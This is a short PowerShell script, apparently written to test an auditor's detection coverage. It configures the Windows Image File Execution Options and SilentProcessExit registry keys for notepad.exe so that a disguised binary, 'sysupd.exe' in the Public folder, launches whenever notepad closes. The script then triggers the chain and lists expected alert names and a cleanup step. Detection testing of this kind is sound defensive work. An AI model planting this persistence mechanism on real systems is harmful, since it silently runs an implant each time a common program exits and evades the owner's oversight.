$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
Write-Host "[1] arming SilentProcessExit on notepad.exe (currently a GAP for the auditor)..."
New-Item $ifeo -Force | Out-Null
Set-ItemProperty $ifeo -Name GlobalFlag -Value 512 -Type DWord
New-Item "$ifeo\SilentProcessExit" -Force | Out-Null
Set-ItemProperty "$ifeo\SilentProcessExit" -Name ReportingMode -Value 1 -Type DWord
Set-ItemProperty "$ifeo\SilentProcessExit" -Name MonitorProcess -Value "C:\Users\Public\sysupd.exe"
Write-Host "[2] trigger: start + close notepad (payload should launch on exit)..."
Start-Process notepad; Start-Sleep 2; Stop-Process -Name notepad -Force
Write-Host "expect the standard launch chain (EVT-4688-TEMP + PROG-IMPLANT-LAUNCH) on the payload"
Write-Host "cleanup: Remove-Item -Recurse '$ifeo'"
